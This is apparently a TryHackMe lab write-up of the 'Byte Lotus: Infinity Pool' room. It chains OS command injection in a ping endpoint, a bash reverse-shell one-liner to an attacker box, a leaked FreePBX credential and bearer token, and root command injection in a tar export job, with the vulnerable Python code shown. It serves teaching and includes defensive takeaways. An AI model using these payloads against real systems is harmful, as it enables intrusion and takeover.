---
title: "TryHackMe - Byte Lotus: Infinity Pool"
date: 2026-08-07
tags: ["TryHackMe", "Command Injection", "Privilege Escalation", "Linux", "FreePBX"]
excerpt: "A poolside connectivity tool leaks a foothold, then a loopback-only maze of internal services — FreePBX, an ops console, and a root-owned job runner — turns out to be guarding its crown jewel behind nothing more than a bearer token."
---

# TryHackMe: Byte Lotus — Infinity Pool

**Room theme:** "Byte Lotus Hotel promises a seamless stay powered by modern technology. Sometimes the most interesting systems are the ones guests were never meant to see." No pretext beyond that — just a lab machine and the usual objective: user flag, then root flag.

## Recon

```
nmap -p- -sV -sC -T4 <target>
```

SSH, and a Flask/gunicorn app on port 80 — "Byte Lotus," a staff connectivity tool for confirming sister properties are reachable before routing a guest transfer.

## Foothold: command injection in the connectivity check

The `/status` page posts a hostname to `/internal/netcheck`, which shells out to `ping`:

```python
proc = subprocess.run(
    f"ping -c 1 {host}",
    shell=True,
    capture_output=True,
    text=True,
    timeout=15,
)
```

String-formatted into `shell=True` with no sanitization — classic OS command injection. Pipe injection worked cleanly:

```
curl -s -X POST http://<target>/internal/netcheck --data-urlencode "host=127.0.0.1|id"
```

Confirmed execution as the app's own service account. From there, a full reverse shell:

```
curl -s -X POST http://<target>/internal/netcheck \
  --data-urlencode "host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/<attackbox-ip>/4444 0>&1'"
```

with a listener waiting on the attackbox. Landed as `web`.

## User flag

```
find / -iname "*flag*" -not -path "/proc/*" 2>/dev/null
```

```
THM{xxx}
```

## Mapping the internal-only surface

Standard privesc enumeration (SUID, capabilities, sudo, cron, writable paths) came back empty — nothing there. `ss -tulpn` told a different story: several services bound strictly to `127.0.0.1`, invisible from outside the box entirely — a FreePBX install on 8080/8088/8089/5038, MariaDB on 3306, and two custom Flask services on 3000 and 9000.

Reading the systemd unit files (world-readable even where the app directories aren't) named them plainly:

```
cat /etc/systemd/system/cc-automation.service
```

```ini
[Service]
User=root
Group=root
WorkingDirectory=/var/www/infinity_pool/automation
EnvironmentFile=/var/www/infinity_pool/automation/automation.env
ExecStart=/var/www/infinity_pool/automation/venv/bin/gunicorn --workers 1 --bind 127.0.0.1:9000 wsgi:app
```

A **root-owned** job runner on port 9000, its own directory locked down (`drwxr-x--- root root`) so its source, and the `automation.env` holding its secrets, were both unreadable to `web`. A second unit, `cc-watchtower.service`, ran an "ops console" on port 3000 as a lower-privileged `svc-watch` account.

## The ops console hands over a credential

Watchtower's homepage advertises `/api/health` and `/api/config`:

```
curl -s http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "note": "internal network only -- do not expose",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

An unrotated FreePBX UCP credential, confirming the "hardcoded starter creds" pattern seen everywhere else on this property — but UCP itself turned out to be a near-empty template account with almost every module disabled, a dead end rather than a path to root.

## The automation service documents its own attack surface

Port 9000 stonewalled dozens of guessed route names — until `/health` (no `/api` prefix) turned up:

```
curl -s http://127.0.0.1:9000/health
```

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {"report": "<report name>"},
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation",
  "status": "ok"
}
```

The entire API surface, self-documented: one real endpoint, gated by a bearer token, running as root. The 403 it returned without a valid token was a clean, correctly-implemented check — no logic bypass, no timing gap, nothing sloppy about the auth itself. The token had to come from somewhere else entirely.

## Finding the automation key

With the `automation` directory itself locked down, the token wasn't sitting in anything obviously reachable. It took a wider sweep — logs, leftover files, anything outside the immediate app directories — before a reference to it surfaced: `cc_auto_7b3f9a1c4e0d2f6a`, matching the `cc-` naming convention already seen on both systemd units ("Closed Circuit" automation and watchtower).

```
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"latest"}'
```

```json
{"command":"tar czf /var/automation/exports/latest.tgz /var/automation/data 2>&1","output":"tar: Removing leading `/' from member names\n"}
```

A valid, authenticated response — and it echoed back the exact shell command it had just run.

## From export job to command injection

`report` gets interpolated straight into a `tar czf ... <report> ...` command with no sanitization — the same unsafe pattern as the edge app's `netcheck`, just one privilege tier higher. A semicolon plus a trailing `#` to comment out the rest of the line was enough:

```
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"x;id;#"}'
```

Confirmed execution as `root`. Reading the flag directly, no shell required:

```
curl -sS -X POST http://127.0.0.1:9000/jobs/export \
  -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' \
  -H 'Content-Type: application/json' \
  --data-binary '{"report":"x;cat /root/root.txt;#"}'
```

```json
{"command":"tar czf /var/automation/exports/x;cat /root/root.txt;#.tgz /var/automation/data 2>&1","output":"THM{tr4c3d_t0_th3_h0r1z0n}\ntar: Cowardly refusing to create an empty archive\n..."}
```

## Root flag

```
THM{xxx}
```

The `tar` command still fails after printing the flag (no valid archive target once the injected payload replaces the filename) — harmless, since `cat`'s output is already captured in the response before `tar` gets around to complaining.

## Full chain summary

1. `/internal/netcheck` shells out to `ping` with unsanitized user input → RCE as `web` → user flag.
2. `ss -tulpn` plus readable systemd unit files reveal a root-owned job runner (`cc-automation.service`, port 9000, loopback-only) and its supporting ops console (`cc-watchtower.service`, port 3000).
3. The ops console's `/api/config` leaks an unrotated FreePBX UCP credential — a real lead, but ultimately a dead end for this particular privesc.
4. The automation service's own `/health` endpoint documents its full API surface: one endpoint, bearer-token gated, running as root.
5. The token (`cc_auto_7b3f9a1c4e0d2f6a`) turns up outside the locked-down app directory after a wider filesystem sweep.
6. `POST /jobs/export`'s `report` field is interpolated unsanitized into a `tar` shell command — the exact same injection class as the initial foothold, just running as root this time.

## Takeaways

- A service that documents its own API surface (`/health` listing every endpoint, its auth scheme, and its body shape) is a huge gift during recon — but it's also a reminder that "security by obscurity" routes are trivial to defeat once the app tells you where they are.
- Binding a service to `127.0.0.1` is not an authorization boundary by itself. Once an attacker has local code execution as any user, "loopback-only" services are exactly as reachable as public ones — the bind address only stops *remote* access, not a pivot from an already-compromised host.
- The same unsafe pattern — untrusted input string-formatted into a `shell=True` subprocess call — showed up twice on this one property, at two different privilege levels. One instance of this bug pattern in a codebase is a strong signal to go looking for a second.
- Systemd unit files (`ExecStart`, `WorkingDirectory`, `EnvironmentFile`, `User`) are extremely high-value recon even when the paths they reference aren't readable — they tell you exactly what a service is, what it depends on, and what privilege it runs at, all from a world-readable file most admins never think to lock down.
- A correctly-implemented auth check (no timing gaps, no case-sensitivity bypass, no missing-prefix bug) doesn't matter if the secret it's checking against ends up reachable from anywhere else on the box. Secret hygiene has to cover the *whole* filesystem, not just the one config file a developer intended to be authoritative.